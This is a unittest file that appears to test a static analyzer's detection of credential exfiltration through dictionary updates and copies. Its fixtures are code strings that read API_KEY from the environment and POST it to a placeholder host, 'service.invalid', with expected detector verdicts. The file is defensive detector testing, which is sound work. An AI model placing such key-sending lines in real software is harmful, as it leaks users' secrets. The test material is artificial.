"""Optional dictionary fields preserve branch presence; sources are never executed."""
import unittest
from test_qindun_certify import MODULE

CASES = [
  [
    "optional_update_preserves_old_secret",
    "import os,requests\nkey=os.getenv(\"API_KEY\")\nsource={}\nif enabled:\n    source[\"value\"]=\"public\"\nfields={\"value\":key}\nfields.update(source)\nrequests.post(\"https://service.invalid\",json=fields[\"value\"])\n",
    [
      "confirmed"
    ]
  ],
  [
    "required_update_replaces_secret",
    "import os,requests\nkey=os.getenv(\"API_KEY\")\nsource={\"value\":\"public\"}\nfields={\"value\":key}\nfields.update(source)\nrequests.post(\"https://service.invalid\",json=fields[\"value\"])\n",
    []
  ],
  [
    "optional_update_default_secret",
    "import os,requests\nkey=os.getenv(\"API_KEY\")\nsource={}\nif enabled:\n    source[\"value\"]=\"public\"\nfields={}\nfields.update(source)\nrequests.post(\"https://service.invalid\",json=fields.get(\"value\",key))\n",
    [
      "confirmed"
    ]
  ],
  [
    "optional_fresh_returns_keep_default",
    "import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={}\nif enabled:\n    fields[\"value\"]=\"public\"\ndef copy():\n    if choose:\n        return dict(fields)\n    return dict(fields)\nvalue=copy()\nrequests.post(\"https://service.invalid\",json=value.get(\"value\",key))\n",
    [
      "confirmed"
    ]
  ],
  [
    "required_fresh_returns_ignore_default",
    "import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={\"value\":\"public\"}\ndef copy():\n    if choose:\n        return dict(fields)\n    return dict(fields)\nvalue=copy()\nrequests.post(\"https://service.invalid\",json=value.get(\"value\",key))\n",
    []
  ],
  [
    "optional_shallow_copy_keeps_default",
    "import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={}\nif enabled:\n    fields[\"value\"]=\"public\"\nvalue=dict(fields)\nrequests.post(\"https://service.invalid\",json=value.get(\"value\",key))\n",
    [
      "confirmed"
    ]
  ],
  [
    "definite_update_makes_optional_field_present",
    "import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={}\nif enabled:\n    fields[\"value\"]=key\nfields.update({\"value\":\"public\"})\nrequests.post(\"https://service.invalid\",json=fields.get(\"value\",key))\n",
    []
  ],
  [
    "keyword_replaces_optional_update",
    "import os,requests\nkey=os.getenv(\"API_KEY\")\nsource={}\nif enabled:\n    source[\"value\"]=\"text\"\nfields={\"value\":key}\nfields.update(source,value=\"public\")\nrequests.post(\"https://service.invalid\",json=fields[\"value\"])\n",
    []
  ]
]

class PythonOptionalFieldTests(unittest.TestCase):
    def test_optional_fields(self):
        for name, source, expected in CASES:
            with self.subTest(case=name):
                hits, error = MODULE._python_flow_findings("main.py", source)
                self.assertIsNone(error)
                self.assertEqual(sorted({h.disposition for h in hits
                    if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"}), expected)

    def test_optional_mutable_update_reports_lost_correlation(self):
        source = (
            'import os,requests\nkey=os.getenv("API_KEY")\n'
            'original={}\nsource={}\nif enabled:\n    source["child"]={}\n'
            'fields={"child":original}\nfields.update(source)\n'
            'original["secret"]=key\nrequests.post("https://service.invalid",json=fields)\n'
        )
        _, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNotNone(error)

    def test_keyword_update_budget_preserves_payload(self):
        fields = [f'field{index}="public"' for index in range(64)] + ["payload=key"]
        source = (
            'import os,requests\nkey=os.getenv("API_KEY")\nfields={}\n'
            + "fields.update(" + ",".join(fields) + ")\n"
            + 'requests.post("https://service.invalid",json=fields)\n'
        )
        hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNotNone(error)
        self.assertIn("confirmed", {h.disposition for h in hits
            if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"})
